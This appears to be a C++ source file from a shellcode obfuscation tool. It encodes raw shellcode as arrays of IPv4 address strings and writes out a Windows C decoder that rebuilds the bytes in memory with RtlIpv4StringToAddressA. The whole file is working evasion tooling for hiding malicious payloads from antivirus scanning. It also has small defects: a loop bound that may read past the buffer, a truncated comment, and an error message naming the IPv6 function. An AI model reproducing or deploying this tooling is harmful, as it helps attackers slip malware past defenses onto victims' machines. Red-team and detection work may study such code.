// Header files //
#include "hdrs/io_operations.h"
#include "hdrs/ipv4_obfuscation.h"
// Local constants //
#define IPV4_ITER 4


void ipv4Gen(uint32_t hex_ip_addr, char* output_buffer, size_t buffer_size) {
    /* Purpose - Converts the passed in hex representation to a char IPv4 address.
     * Parameters:
     *      @ hex_ip_addr - The hex representation of IPv4 address to be converted.
     *      @ output_buffer - A pointer to the char buffer where the formatted result will reside.
     *      @ buffer_size - The size of the output buffer where the formatted output will be stored.
     */
    snprintf(output_buffer, buffer_size, "%d.%d.%d.%d",
             (hex_ip_addr >> 24) & 0xFF,
             (hex_ip_addr >> 16) & 0xFF,
             (hex_ip_addr >> 8) & 0xFF,
             hex_ip_addr & 0xFF);
}


uint32_t ipv4HexGen(int byte_1, int byte_2, int byte_3, int byte_4) {
    /* Purpose - Takes the 4 bytes of passed in shellcode data and generates a hex value to be
     *           converted to an IPv4 address in another function.
     * Parameters:
     *      @ byte_1 - First byte of shellcode.
     *      @ byte_2 - Second byte of shellcode.
     *      @ byte_3 - Third byte of shellcode.
     *      @ byte_4 - Fourth byte of shellcode.
     *
     * Returns - The formatted hex value of the passed in 4 bytes.
     */
    return ((uint32_t)byte_1 << 24) | ((uint32_t)byte_2 << 16) | (byte_3 << 8) | byte_4;
}


void ipv4ObfuscationHandler(ShellcodeStruct& shell_struct) {
    /* Purpose - Takes the shellcode stored in passed in struct and
     * Parameters:
     *      @ shell_struct - The shellcode struct where the shellcode to be obfuscated resides.
     */
    const char file_header[] = "#include <Windows.h>\n"
                               "#include <stdio.h>\n"
                               "#include <Ip2string.h>\n"
                               "#pragma comment(lib, \"Ntdll.lib\")\n\n"
                               "#ifndef NT_SUCCESS\n"
                               "#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n"
                               "#endif\n";
    // Write the header file //
    writeOutputData(shell_struct, file_header);

    const char payload_bracket_inner[] = "\nconst char * IPv4Shell [] = { \n\t";
    // Write the inner bracket of obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_inner);

    unsigned int num_elements = 0;
    char formatted_ip[16];
    char format_comma[32];
    uint32_t hex_ip_addr;

    // Iterate over the shellcode by increments of 4 //
    for (int iter = 0; iter <= shell_struct.result_size; iter += IPV4_ITER) {
        // Generate the hex representation of the next 4 bytes of data //
        hex_ip_addr = ipv4HexGen(shell_struct.pad_shellcode_ptr[iter],
                                 shell_struct.pad_shellcode_ptr[iter + 1],
                                 shell_struct.pad_shellcode_ptr[iter + 2],
                                 shell_struct.pad_shellcode_ptr[iter + 3]);
        // Generate the readable string version from hex representation //
        ipv4Gen(hex_ip_addr, formatted_ip, sizeof(formatted_ip));

        // Format generated IPv4 address as comma separated //
        snprintf(format_comma, sizeof(format_comma), "\"%s\",", formatted_ip);
        // Write the formatted comma-separated IP address member //
        writeOutputData(shell_struct, format_comma);

        // Check if a newline is needed (every 6 entries) except for the last entry //
        if (((iter + IPV4_ITER) % 24 == 0) && (iter + IPV4_ITER < shell_struct.result_size)) {
            writeOutputData(shell_struct, "\n\t");
        }
        num_elements++;
    }
    // Move the file stream pointer back one index to overwrite the last comma //
    shell_struct.output_stream.seekp(-1, std::ios_base::end);

    const char payload_bracket_outer[] = "\n};\n\n";
    // Write the outer bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_outer);

    const char shellcode_preparse[] = "#define ElementsNumber %d\n"
                                      "#define SizeOfShellcode %d\n\n";
    char shellcode_constants[sizeof(shellcode_preparse) + 10];
    // Parse the formatted string in result buffer //
    snprintf(shellcode_constants, sizeof(shellcode_constants), shellcode_preparse,
             num_elements, shell_struct.result_size);
    // Write the formatted constants //
    writeOutputData(shell_struct, shellcode_constants);

    const char decoder[] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n"
                           "    PCSTR Terminator = NULL;\n"
                           "    PVOID LpBaseAddress2 = NULL;\n"
                           "    NTSTATUS STATUS;\n\tint i = 0;\n\n"
                           "    for (int j = 0; j < ElementsNumber; j++) {\n"
                           "        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n"
                           "        STATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n"
                           "        if (!NT_SUCCESS(STATUS)) {\n"
                           "            printf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n"
                           "            return FALSE;\n"
                           "        }\n"
                           "        else {\n"
                           "            i = i + 4;\n"
                           "        }\n"
                           "    }\n"
                           "    return TRUE;\n"
                           "}\n";
    // Write the decoder function //
    writeOutputData(shell_struct, decoder);
}